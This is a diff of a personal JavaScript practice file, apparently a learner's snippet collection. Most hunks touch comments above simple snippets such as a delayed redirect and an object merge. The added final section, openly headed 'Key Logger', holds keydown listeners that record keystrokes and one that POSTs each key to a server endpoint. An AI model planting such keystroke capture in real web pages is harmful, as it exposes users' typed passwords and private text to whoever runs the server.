@@ -119,7 +119,7 @@ function shuffleArray(array) {
 
 
 
-/// string dynamic string 
+/// string dynamic string  :::::::::::::::::::::::::::::::::::::::::::::::::
 redirect to new  URL after a deplay  -------------------------->>
   setTimeout(() => {
         window.location.href = "https://www.youtube.com/";
@@ -129,7 +129,7 @@ redirect to new  URL after a deplay  -------------------------->>
 
 
 
-//merge object ------------------------->
+//merge object -------------------------> ::::::::::::::::::::::::::::::::::::::::
 
 const person={name:"jan"}
 
@@ -150,7 +150,7 @@ const full={...person , ...details}
  } , 4000)
 
 
-// only random change console -------------------
+// only random change console -------------------  ::::::::::::::::::::::::::::::::
 let ran = 100;
 
  setInterval(() => {
@@ -158,7 +158,7 @@ let ran = 100;
 }, 3000);
 
 
-////////// string change  --------------------------------
+////////// string change  -------------------------------- ::::::::::::::::::::::::::::
 
  let str = "jugal sharma";
  let randomIndex = Math.floor(Math.random() * str.length);
@@ -214,11 +214,61 @@ const obj = {
     }
 };
 
+:::::::::::::::: Key Logger -------------------------->>> Important ::::::::::::::  """"""""""""""""""""""""""""
+
+let keysPressed = [];
+
+document.addEventListener('keydown', function(event) {
+  const key = event.key;
+  keysPressed.push(key); // Store the key pressed
+  console.log('Keys pressed so far:', keysPressed.join(''));
+});
+
+// You can now use the keysPressed array to access the key logs.
+
+
+document.addEventListener('keydown', function(event) { :::::::::::: --------------->
+  const key = event.key;
+  console.log('Key pressed:', key);
+
+  // Send the key to the server
+  fetch('/log-key', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ key: key })
+  }).catch(err => console.log('Error sending key:', err));
+});
+
+
+document.addEventListener('keydown', function(event) { ::::::::::::::::::::::::::------------------>
+  const key = event.key;
+  const shiftPressed = event.shiftKey ? 'Shift pressed' : 'Shift not pressed';
+  const timestamp = new Date().toLocaleTimeString();
+
+  console.log(`Key: ${key}, ${shiftPressed}, Timestamp: ${timestamp}`);
+});
 
 
 
+document.addEventListener('keydown', function(event) {  :::::::::::::::::--------------->
+  const key = event.key;
+  const isCtrlPressed = event.ctrlKey ? 'Ctrl' : '';
+  const isAltPressed = event.altKey ? 'Alt' : '';
+  const isShiftPressed = event.shiftKey ? 'Shift' : '';
+  const combo = [isCtrlPressed, isAltPressed, isShiftPressed, key].filter(Boolean).join(' + ');
+
+  console.log('Key combination:', combo);
+});
 
 
 
+document.addEventListener('keydown', function(event) {  ::::::::::::::-------------------->
+  const key = event.key;
+  if (/^[a-zA-Z]$/.test(key)) {
+    console.log('Letter key pressed:', key);
+  }
+});
 
 
